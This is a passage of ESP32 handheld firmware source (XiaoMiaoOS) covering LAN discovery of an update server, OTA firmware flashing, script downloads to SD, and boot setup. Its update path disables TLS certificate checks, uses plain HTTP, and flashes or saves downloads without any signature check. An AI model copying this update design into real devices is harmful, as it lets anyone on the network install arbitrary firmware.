    for (int host = startHost; host <= endHost; host++) {
        IPAddress testIP(baseIP[0], baseIP[1], baseIP[2], host);
        
        // Show scanning progress
        tft.fillRect(4, scanY, SCR_W - 8, 10, C_BLACK);
        tft.setTextColor(C_YELLOW, C_BLACK);
        tft.setCursor(4, scanY);
        tft.printf("-> %d.%d.%d.%d", baseIP[0], baseIP[1], baseIP[2], host);
        
        // Quick TCP connect test (fast fail)
        WiFiClient tcp;
        tcp.setTimeout(200);
        bool connected = false;
        if (tcp.connect(testIP, 8080)) {
            connected = true;
            tcp.stop();
        }
        
        if (!connected) {
            delay(5);
            yield();  // Feed watchdog to prevent reboot during scan
            continue;
        }
        
        // Port is open! Try HTTP GET version.json
        Serial.printf("[UPDATE] Port 8080 open at %s, testing...\n", testIP.toString().c_str());
        String url = "http://" + testIP.toString() + ":8080/version.json";
        HTTPClient http;
        WiFiClient client;
        http.begin(client, url);
        http.setTimeout(1000);
        int code = http.GET();
        
        if (code == 200) {
            String body = http.getString();
            http.end();
            
            DynamicJsonDocument testDoc(512);
            if (deserializeJson(testDoc, body) == DeserializationError::Ok) {
                if (testDoc.containsKey("latest")) {
                    // Found the server!
                    Serial.println("[UPDATE] Server found!");
                    
                    // Save URL to NVS
                    String foundUrl = "http://" + testIP.toString() + ":8080/version.json";
                    strncpy(g_update_url, foundUrl.c_str(), 127);
                    g_update_url[127] = '\0';
                    update_url_save(g_update_url);
                    
                    // Compute base URL
                    strncpy(g_update_base, g_update_url, 127);
                    g_update_base[127] = '\0';
                    char* last_slash = strrchr(g_update_base, '/');
                    if (last_slash) *(last_slash + 1) = '\0';
                    
                    // Show found message
                    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
                    scr_draw_title("Found!");
                    tft.setTextColor(C_GREEN, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 18);
                    tft.print("Server OK!");
                    tft.setTextColor(C_CYAN, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 32);
                    tft.printf("%d.%d.%d.%d:8080",
                        baseIP[0], baseIP[1], baseIP[2], host);
                    tft.setTextColor(C_DGRAY, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 46);
                    tft.print("URL saved.");
                    tft.setCursor(4, CONTENT_Y + 58);
                    tft.setTextColor(C_CYAN, C_BLACK);
                    tft.print("Checking update...");
                    delay(800);
                    return true;
                }
            }
        }
        http.end();
        delay(5);
    }
    
    // Not found
    Serial.println("[UPDATE] Server not found on LAN");
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Not Found");
    tft.setTextFont(1);
    tft.setTextColor(C_RED, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 16);
    tft.print("No server found");
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 30);
    tft.print("Make sure phone");
    tft.setCursor(4, CONTENT_Y + 42);
    tft.print("WebDAV is running");
    tft.setCursor(4, CONTENT_Y + 56);
    tft.print("on same WiFi");
    tft.setTextColor(C_RED, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 70);
    tft.print("B:BACK");
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
    return false;
}

// ═══════════════ SYSTEM UPDATE — manual check from menu ═══════════════
// ═══════════════ SYSTEM & UPDATE (融合: 设备信息 + 检查更新) ═══════════════
static void sys_update() {
    Serial.println("[SYS] System & Update page");
    
    // ── Phase 1: Show device info + options ──
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("系统更新");
    tft.setTextFont(1);
    
    // Device info section
    int y = CONTENT_Y + 4;
    
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(2, y); tft.print("FW: ");
    tft.setTextColor(C_GREEN, C_BLACK);
    tft.print("v" FW_VERSION);
    
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(82, y);
    tft.print("ESP32");
    y += 9;
    
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(2, y); tft.print("Flash: ");
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.print("4MB");
    
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(60, y); tft.print("SD:");
    tft.setTextColor(sd_ok ? C_GREEN : C_DGRAY, C_BLACK);
    tft.setCursor(78, y);
    tft.print(sd_ok ? "OK" : "N/A");
    y += 9;
    
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(2, y); tft.print("WiFi:");
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(26, y);
    if (g_wifi_mode == WM_STA) { tft.setTextColor(C_GREEN, C_BLACK); tft.print("STA"); }
    else if (g_wifi_mode == WM_AP) { tft.setTextColor(C_CYAN, C_BLACK); tft.print("AP"); }
    else { tft.setTextColor(C_RED, C_BLACK); tft.print("OFF"); }
    
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(50, y); tft.print("MAC:");
    tft.setTextColor(C_DGRAY, C_BLACK);
    y += 9;
    
    // MAC address (compact)
    String mac = WiFi.macAddress();
    mac.replace(":", "");
    tft.setCursor(2, y);
    tft.setTextColor(C_DGRAY, C_BLACK);
    // Show last 6 chars of MAC
    if (mac.length() >= 6) tft.print(mac.substring(mac.length() - 6));
    y += 9;
    
    tft.drawFastHLine(2, y, SCR_W - 4, C_DGRAY);
    y += 3;
    
    // ── Auto-detected update notification ──
    if (g_update_available) {
        tft.setTextColor(C_YELLOW, C_BLACK);
        tft.setCursor(2, y);
        tft.print("*NEW: v");
        tft.print(g_update_new_ver);
        tft.print("*");
        y += 9;
        if (g_update_new_code[0]) {
            tft.setTextColor(C_CYAN, C_BLACK);
            tft.setCursor(2, y);
            char code_clip[16];
            scr_clip_text(code_clip, g_update_new_code, 15);
            tft.print(code_clip);
            y += 9;
        }
        tft.drawFastHLine(2, y, SCR_W - 4, C_DGRAY);
        y += 3;
    }
    
    // Options
    if (g_update_available) {
        cnfont_print(2, y, "A: 立即更新!", C_GREEN, C_BLACK);
    } else {
        cnfont_print(2, y, "A: 检查更新", C_YELLOW, C_BLACK);
    }
    y += 16;
    cnfont_print(2, y, "B: 返回", C_DGRAY, C_BLACK);
    
    // ── Wait for user input ──
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            break;  // Proceed to update check
        }
        delay(20);
    }
    
    // ── Phase 2: Check WiFi ──
    if (g_wifi_mode == WM_OFF) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("更新");
        tft.setTextFont(1);
        cnfont_print(4, CONTENT_Y + 20, "无WiFi!", C_RED, C_BLACK);
        cnfont_print(4, CONTENT_Y + 36, "请先连接WiFi", C_DGRAY, C_BLACK);
        cnfont_print(4, CONTENT_Y + 52, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    // ── Phase 3: Check URL configured? Auto-discover if not ──
    if (strlen(g_update_url) == 0) {
        Serial.println("[UPDATE] No URL configured, auto-discovering...");
        if (!auto_discover_server()) {
            return;  // Discovery failed, error shown
        }
    }

    // ── Phase 4: Fetch version.json ──
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("检查更新");
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "检查中...", C_CYAN, C_BLACK);
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 32);
    tft.print(g_update_url);
    
    // Animated dots
    for (int i = 0; i < 3; i++) {
        tft.fillRect(4, CONTENT_Y + 40, 60, 10, C_BLACK);
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 40);
        for (int d = 0; d <= i; d++) tft.print(".");
        delay(300);
    }
    
    // ── HTTP request ──
    HTTPClient http;
    bool isHttps = (strncmp(g_update_url, "https", 5) == 0);
    WiFiClient* plain = nullptr;
    WiFiClientSecure* ssl = nullptr;
    
    if (isHttps) {
        ssl = new WiFiClientSecure();
        ssl->setInsecure();
        http.begin(*ssl, g_update_url);
    } else {
        plain = new WiFiClient();
        http.begin(*plain, g_update_url);
    }
    http.setTimeout(8000);
    int code = http.GET();
    
    if (code != 200) {
        Serial.printf("[UPDATE] HTTP error: %d\n", code);
        http.end();
        if (plain) delete plain;
        if (ssl) delete ssl;
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("更新");
        cnfont_print(4, CONTENT_Y + 20, "服务器错误", C_RED, C_BLACK);
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 36);
        tft.print("HTTP ");
        tft.print(code);
        cnfont_print(4, CONTENT_Y + 60, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    String body = http.getString();
    http.end();
    if (plain) delete plain;
    if (ssl) delete ssl;
    
    // ── Parse JSON (heap-allocated to avoid stack overflow) ──
    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, body);
    if (err) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("更新");
        cnfont_print(4, CONTENT_Y + 20, "解析错误", C_RED, C_BLACK);
        cnfont_print(4, CONTENT_Y + 60, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    const char* latestVer = doc["latest"]["version"];
    const char* latestCode = doc["latest"]["codename"];
    const char* latestDate = doc["latest"]["date"];
    
    // Support both new format (files.ota.url) and old format (latest.url)
    const char* fwUrl = nullptr;
    int latestSize = 0;
    if (doc["latest"].containsKey("files") && doc["latest"]["files"].containsKey("ota")) {
        fwUrl = doc["latest"]["files"]["ota"]["url"];
        latestSize = doc["latest"]["files"]["ota"]["size"];
    } else {
        fwUrl = doc["latest"]["url"];
        latestSize = doc["latest"]["size"] | 0;
    }
    
    if (!latestVer) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("更新");
        cnfont_print(4, CONTENT_Y + 20, "无版本信息", C_RED, C_BLACK);
        cnfont_print(4, CONTENT_Y + 60, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    // ── Compare versions ──
    String currentVer = String(FW_VERSION);
    String remoteVer = String(latestVer);
    Serial.printf("[UPDATE] Current: %s, Remote: %s\n", currentVer.c_str(), remoteVer.c_str());
    
    bool needUpdate = false;
    {
        int cp1=0, cp2=0, cp3=0, rp1=0, rp2=0, rp3=0;
        sscanf(currentVer.c_str(), "%d.%d.%d", &cp1, &cp2, &cp3);
        sscanf(remoteVer.c_str(), "%d.%d.%d", &rp1, &rp2, &rp3);
        if (rp1 > cp1 || (rp1 == cp1 && rp2 > cp2) || (rp1 == cp1 && rp2 == cp2 && rp3 > cp3)) {
            needUpdate = true;
        }
    }
    
    if (!needUpdate) {
        // ── Already latest ──
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("更新");
        cnfont_print_centered(CONTENT_Y + 16, "已是最新", C_GREEN, C_BLACK);
        tft.setTextFont(1);
        tft.setTextColor(C_CYAN, C_BLACK);
        String vInfo = "v" + currentVer;
        if (latestCode) vInfo += " (" + String(latestCode) + ")";
        scr_center(vInfo.c_str(), CONTENT_Y + 40, 1, C_CYAN, C_BLACK);
        cnfont_print_centered(CONTENT_Y + 56, "最新固件", C_DGRAY, C_BLACK);
        cnfont_print_centered(CONTENT_Y + 72, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    // ── Update available: show changelog ──
    Serial.println("[UPDATE] New version available!");
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("发现新版本");

    y = CONTENT_Y + 12;
    tft.setTextFont(1);
    
    tft.setTextColor(C_YELLOW, C_BLACK);
    tft.setCursor(2, y); tft.print("v"); tft.print(latestVer);
    y += 9;
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(2, y); tft.print("from v"); tft.print(FW_VERSION);
    y += 9;
    if (latestCode) {
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(2, y); tft.print(latestCode);
        y += 9;
    }
    if (latestDate) {
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(2, y); tft.print(latestDate);
        y += 9;
    }
    if (latestSize > 0) {
        tft.setCursor(2, y); tft.print(latestSize / 1024); tft.print(" KB");
        y += 9;
    }
    
    y += 1;
    tft.drawFastHLine(2, y, SCR_W - 4, C_DGRAY);
    y += 3;
    
    // Changelog
    JsonArray changelog = doc["latest"]["changelog"];
    int totalChanges = changelog.size();
    int maxDisplay = 4;
    int displayCount = (totalChanges < maxDisplay) ? totalChanges : maxDisplay;
    
    tft.setTextColor(C_WHITE, C_BLACK);
    for (int i = 0; i < displayCount; i++) {
        const char* change = changelog[i].as<const char*>();
        if (change) {
            char buf[24];
            scr_clip_text(buf, change, 21);
            tft.setTextColor(C_GREEN, C_BLACK);
            tft.setCursor(2, y);
            tft.print("- ");
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.print(buf);
            y += 9;
        }
    }
    if (totalChanges > maxDisplay) {
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(2, y);
        tft.print("+ ");
        tft.print(totalChanges - maxDisplay);
        tft.print(" more...");
        y += 9;
    }
    
    // Options
    y = SCR_H - 12;
    tft.drawFastHLine(2, y - 2, SCR_W - 4, C_DGRAY);
    cnfont_print(2, y, "A:更新", C_GREEN, C_BLACK);
    cnfont_print(70, y, "B:跳过", C_DGRAY, C_BLACK);
    
    // ── Wait for user choice ──
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            Serial.println("[UPDATE] User skipped");
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            break;
        }
        delay(20);
    }
    
    // ── Perform OTA update ──
    Serial.println("[UPDATE] Starting OTA...");
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("更新中");
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "下载中...", C_YELLOW, C_BLACK);
    tft.drawFastHLine(4, CONTENT_Y + 30, SCR_W - 8, C_DGRAY);
    
    // Resolve firmware URL
    String fullUrl = String(fwUrl);
    if (fullUrl.startsWith("firmware/")) {
        int lastSlash = String(g_update_url).lastIndexOf('/');
        if (lastSlash > 0) {
            fullUrl = String(g_update_url).substring(0, lastSlash + 1) + fullUrl;
        }
    }
    
    Serial.println("[UPDATE] Firmware URL: " + fullUrl);
    
    HTTPClient fwHttp;
    WiFiClient fwPlain;
    WiFiClientSecure fwSsl;
    if (fullUrl.startsWith("https")) {
        fwSsl.setInsecure();
        fwHttp.begin(fwSsl, fullUrl);
    } else {
        fwHttp.begin(fwPlain, fullUrl);
    }
    fwHttp.setTimeout(30000);
    int fwCode = fwHttp.GET();
    if (fwCode != 200) {
        Serial.printf("[UPDATE] Download failed: HTTP %d\n", fwCode);
        cnfont_print(4, CONTENT_Y + 40, "下载失败!", C_RED, C_BLACK);
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 56);
        tft.print("HTTP "); tft.print(fwCode);
        fwHttp.end();
        cnfont_print(4, SCR_H - 12, "B:返回", C_RED, C_BLACK);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    int fwLen = fwHttp.getSize();
    Serial.printf("[UPDATE] Firmware size: %d bytes\n", fwLen);
    WiFiClient* stream = fwHttp.getStreamPtr();
    
    if (!Update.begin(fwLen > 0 ? fwLen : UPDATE_SIZE_UNKNOWN)) {
        Serial.println("[UPDATE] Update.begin failed");
        cnfont_print(4, CONTENT_Y + 40, "开始失败!", C_RED, C_BLACK);
        fwHttp.end();
        delay(2000);
        return;
    }
    
    // Download + flash with progress
    uint8_t buf[4096];
    size_t total = 0;
    int lastPct = -1;
    while (fwHttp.connected() && (fwLen > 0 ? total < (size_t)fwLen : true)) {
        size_t avail = stream->available();
        if (avail) {
            size_t readLen = (avail > sizeof(buf)) ? sizeof(buf) : avail;
            int c = stream->readBytes(buf, readLen);
            if (c > 0) {
                if (Update.write(buf, c) != c) {
                    Serial.println("[UPDATE] Write failed");
                    Update.abort();
                    cnfont_print(4, CONTENT_Y + 40, "写入失败!", C_RED, C_BLACK);
                    fwHttp.end();
                    delay(2000);
                    return;
                }
                total += c;
                
                if (fwLen > 0) {
                    int pct = (total * 100) / fwLen;
                    if (pct != lastPct) {
                        lastPct = pct;
                        int barW = (SCR_W - 12) * pct / 100;
                        tft.fillRect(4, CONTENT_Y + 32, SCR_W - 8, 8, C_DGRAY);
                        tft.fillRect(4, CONTENT_Y + 32, barW, 8, C_GREEN);
                        tft.setTextColor(C_WHITE, C_BLACK);
                        tft.setCursor(4, CONTENT_Y + 44);
                        tft.printf("%d%% (%dKB)", pct, total / 1024);
                    }
                }
            }
        }
        delay(1);
        yield();
    }
    fwHttp.end();
    
    Serial.printf("[UPDATE] Downloaded %u bytes\n", total);
    
    if (!Update.end(true)) {
        Serial.printf("[UPDATE] Flash failed: %s\n", Update.errorString());
        cnfont_print(4, CONTENT_Y + 40, "刷写失败!", C_RED, C_BLACK);
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 56);
        tft.print(Update.errorString());
        delay(3000);
        return;
    }
    
    Serial.println("[UPDATE] OTA success, rebooting...");
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("更新完成");
    cnfont_print_centered(CONTENT_Y + 20, "成功!", C_GREEN, C_BLACK);
    tft.setTextFont(1);
    cnfont_print_centered(CONTENT_Y + 44, "重启中...", C_CYAN, C_BLACK);
    cnfont_print_centered(CONTENT_Y + 60, "崩溃自动回滚", C_DGRAY, C_BLACK);
    delay(1500);
    ESP.restart();
}

// ═══════════════ APP CENTER — download files/firmware from WebDAV ═══════════════
static void sys_appcenter() {
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("App Center");
    
    tft.setTextFont(1);
    int y = CONTENT_Y + 14;
    
    // Check WiFi
    if (g_wifi_mode == WM_OFF) {
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, y);
        tft.print("No WiFi!");
        y += 12;
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, y);
        tft.print("Connect first");
        y += 16;
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, y);
        tft.print("B:BACK");
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    // Check if update URL is configured
    if (strlen(g_update_url) == 0) {
        // Try auto-discover
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, y);
        tft.print("Scanning LAN...");
        y += 12;
        
        // Quick scan for server
        IPAddress baseIP;
        int startHost, endHost;
        
        if (g_wifi_mode == WM_AP) {
            baseIP = IPAddress(192, 168, 4, 0);
            startHost = 2; endHost = 10;
        } else {
            IPAddress myIP = WiFi.localIP();
            baseIP = IPAddress(myIP[0], myIP[1], myIP[2], 0);
            startHost = 1; endHost = 20;
        }
        
        bool found = false;
        for (int host = startHost; host <= endHost; host++) {
            IPAddress testIP(baseIP[0], baseIP[1], baseIP[2], host);
            tft.fillRect(4, y, SCR_W - 8, 8, C_BLACK);
            tft.setTextColor(C_YELLOW, C_BLACK);
            tft.setCursor(4, y);
            tft.printf("-> %d.%d.%d.%d", baseIP[0], baseIP[1], baseIP[2], host);
            
            WiFiClient tcp;
            tcp.setTimeout(200);
            if (tcp.connect(testIP, 8080)) {
                tcp.stop();
                String url = "http://" + testIP.toString() + ":8080/version.json";
                HTTPClient http;
                WiFiClient client;
                http.begin(client, url);
                http.setTimeout(1000);
                if (http.GET() == 200) {
                    String body = http.getString();
                    http.end();
                    StaticJsonDocument<512> doc;
                    if (deserializeJson(doc, body) == DeserializationError::Ok && doc.containsKey("latest")) {
                        String foundUrl = "http://" + testIP.toString() + ":8080/version.json";
                        strncpy(g_update_url, foundUrl.c_str(), 127);
                        g_update_url[127] = '\0';
                        update_url_save(g_update_url);
                        strncpy(g_update_base, g_update_url, 127);
                        g_update_base[127] = '\0';
                        char* ls = strrchr(g_update_base, '/');
                        if (ls) *(ls + 1) = '\0';
                        found = true;
                        break;
                    }
                }
            }
            delay(5);
        }
        
        if (!found) {
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("App Center");
            tft.setTextColor(C_RED, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 20);
            tft.print("Not found");
            tft.setTextColor(C_DGRAY, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 34);
            tft.print("Start WebDAV");
            tft.setCursor(4, CONTENT_Y + 46);
            tft.print("on phone first");
            tft.setCursor(4, CONTENT_Y + 70);
            tft.setTextColor(C_RED, C_BLACK);
            tft.print("B:BACK");
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
            return;
        }
        
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("App Center");
        y = CONTENT_Y + 14;
        tft.setTextColor(C_GREEN, C_BLACK);
        tft.setCursor(4, y);
        tft.print("Server found!");
        y += 16;
    }
    
    // Show available options
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(4, y); tft.print("1.Firmware"); y += 10;
    tft.setCursor(4, y); tft.print("2.Scripts"); y += 10;
    tft.setCursor(4, y); tft.print("3.All Files"); y += 10;
    
    y += 4;
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(4, y);
    tft.printf("URL: %s", g_update_base);
    y += 16;
    
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(4, y); tft.print("1/2/3:Download");
    y += 10;
    tft.setTextColor(C_RED, C_BLACK);
    tft.setCursor(4, y); tft.print("B:BACK");
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_LEFT) == BTN_EVENT_PRESS || 
            buttons_get_event(BTN_ID_UP) == BTN_EVENT_PRESS) {
            // Download firmware
            buzzer_click();
            sys_update();  // reuse update check
            break;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            // Download scripts
            buzzer_click();
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("Downloading");
            tft.setTextFont(1);
            tft.setTextColor(C_CYAN, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 20);
            tft.print("Pulling scripts...");
            
            const char* files[] = {"start_all.sh", "webdav_server.py", "relay_server.sh",
                                   "watchdog.sh", "tunnel_watchdog.py", "xm"};
            int fcount = 6;
            int dy = CONTENT_Y + 34;
            
            if (sd_ok) {
                for (int i = 0; i < fcount; i++) {
                    String url = String(g_update_base) + files[i];
                    HTTPClient http;
                    WiFiClient client;
                    http.begin(client, url);
                    http.setTimeout(5000);
                    int code = http.GET();
                    if (code == 200) {
                        String data = http.getString();
                        String path = String(SD_LOGS_DIR) + "/" + files[i];
                        File f = SD.open(path, FILE_WRITE);
                        if (f) {
                            f.print(data);
                            f.close();
                            tft.setTextColor(C_GREEN, C_BLACK);
                            tft.setCursor(4, dy);
                            tft.printf("ok %s", files[i]);
                        }
                    } else {
                        tft.setTextColor(C_RED, C_BLACK);
                        tft.setCursor(4, dy);
                        tft.printf("fail %s", files[i]);
                    }
                    http.end();
                    dy += 10;
                }
            } else {
                tft.setTextColor(C_RED, C_BLACK);
                tft.setCursor(4, dy);
                tft.print("No SD card!");
            }
            
            tft.setTextColor(C_RED, C_BLACK);
            tft.setCursor(4, CONTENT_Y + 100);
            tft.print("B:BACK");
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
            break;
        }
        delay(30);
    }
}

// ═══════════════ REBOOT ═══════════════
static void sys_reboot() {
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("重启");
    
    tft.drawRect(30, CONTENT_Y + 20, 100, 50, C_DGRAY);
    cnfont_print_centered(CONTENT_Y + 32, "重启?", C_RED, C_BLACK);
    cnfont_print_centered(CONTENT_Y + 52, "A:是  B:否", C_WHITE, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            tft.fillScreen(C_BLACK);
            cnfont_print_centered(SCR_H / 2, "重启中...", C_RED, C_BLACK);
            delay(1000);
            ESP.restart();
        }
        delay(30);
    }
}

// ═══════════════ ABOUT ═══════════════
// ═══════════════ SETUP ═══════════════
void setup() {
    Serial.begin(115200);
    delay(100); // Let serial settle
    
    // ── Boot loop detection using RTC memory ──
    bool boot_loop = false;
    if (g_boot_magic != BOOT_MAGIC) {
        g_boot_magic = BOOT_MAGIC;
        g_boot_count = 0;
        Serial.println("[BOOT] Fresh power-on (magic reset)");
    } else {
        g_boot_count++;
        Serial.printf("[BOOT] Soft reset, boot count: %u\n", g_boot_count);
        if (g_boot_count >= BOOT_MAX_LOOP) {
            boot_loop = true;
            Serial.println("[BOOT] *** BOOT LOOP DETECTED — safe mode ***");
        }
    }
    
    Serial.println("\n\n╔══════════════════════════════════╗");
    Serial.print  ("║  XiaoMiaoOS v");
    Serial.print(FW_VERSION);
    Serial.println(" BOOTING...   ║");
    Serial.println("╚══════════════════════════════════╝");
    
    // ── OTA Rollback Check ──
    const esp_partition_t* running = esp_ota_get_running_partition();
    esp_ota_img_states_t ota_state;
    bool ota_pending = false;
    if (esp_ota_get_state_partition(running, &ota_state) == ESP_OK) {
        if (ota_state == ESP_OTA_IMG_PENDING_VERIFY) {
            ota_pending = true;
            Serial.println("[BOOT] *** OTA PENDING VERIFY — firmware not yet confirmed ***");
        } else if (ota_state == ESP_OTA_IMG_VALID) {
            Serial.println("[BOOT] OTA partition state: VALID");
        }
    }
    
    // ── Power: lower CPU freq to reduce brownout risk ──
    setCpuFrequencyMhz(160);
    
    pinMode(BZR_PIN, OUTPUT);
    digitalWrite(BZR_PIN, LOW);
    
    g_cfg.time24h = true;
    g_cfg.brightness = 8;
    g_cfg.buzzer_on = true;
    g_cfg.tz_offset = 8;
    g_cfg.lock_timeout = 60000;
    strcpy(g_cfg.ntp_srv, "pool.ntp.org");
    
    // ═══════════════════════════════════════════════════════════════
    //  CRITICAL: Initialize TFT FIRST — before NVS, WiFi, SD, anything!
    //  v2.2.2 white-screen bug: NVS/WiFi init sometimes crashed before
    //  scr_init() ran, leaving the screen white with no debug info.
    //  Now we init the screen ASAP so even if later steps fail, the user
    //  sees something on screen instead of a blank white display.
    // ═══════════════════════════════════════════════════════════════
    
    // ── Phase 0: TFT init — earliest possible ──
    Serial.println("[BOOT] Phase 0: scr_init (TFT FIRST!)...");
    buttons_init();  // Need buttons for factory reset check
    scr_init();      // tft.init() — screen goes from white → black
    
    // ── Factory Reset: hold button A during boot to erase NVS ──
    // This recovers from "white screen" caused by corrupted NVS data.
    delay(50);  // Let button settle
    if (digitalRead(BTN_A) == LOW) {
        // Button A pressed (active low) — factory reset
        tft.fillScreen(C_RED);
        scr_center("FACTORY RESET", SCR_H / 2 - 6, 2, C_WHITE, C_RED);
        scr_center("Erasing NVS...", SCR_H / 2 + 10, 1, C_WHITE, C_RED);
        Serial.println("[BOOT] *** FACTORY RESET (BTN_A held) — erasing NVS ***");
        nvs_flash_erase();
        nvs_flash_init();
        // Also erase otadata to fix boot partition confusion
        esp_partition_erase_range(esp_partition_find_first(
            ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_OTA, NULL), 0, 0x2000);
        tft.fillScreen(C_BLACK);
        scr_center("Done! Releasing...", SCR_H / 2, 1, C_GREEN, C_BLACK);
        delay(1000);
    }
    
    // ── Initialize NVS (required for Preferences/WiFi) ──
    esp_err_t nvs_err = nvs_flash_init();
    if (nvs_err == ESP_ERR_NVS_NO_FREE_PAGES || nvs_err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        Serial.println("[BOOT] NVS corrupted, erasing...");
        nvs_flash_erase();
        nvs_flash_init();
    }
    
    // Load persisted update URL
    update_url_load();
    
    buzzer_init();
    
    // ═══════════════════════════════════════════════════════════════
    //  BOOT FLOW v2.2.5 — Zero White Screen
    // ═══════════════════════════════════════════════════════════════
    //  scr_init() → boot_screen() → menu_init() → loop() → lock_draw()
    //  
    //  NO tft.init() or tft_restore() between boot_screen and lock_draw!
    //  SD init is DEFERRED to first use (sys_files, exploit_log, etc.)
    //  boot_check_update is DEFERRED to loop() (runs 5s after boot)
    //
    //  This is the root cause fix for all white screen issues:
    //  v2.2.2: sd_init() → tft_restore() → tft.init() = WHITE FLASH
    //  v2.2.5: sd_init removed from boot path = ZERO white after scr_init
    // ═══════════════════════════════════════════════════════════════
    
    // ── Boot animation (includes WiFi connect during progress bar) ──
    Serial.println("[BOOT] boot_screen...");
    boot_screen(boot_loop, ota_pending);
    
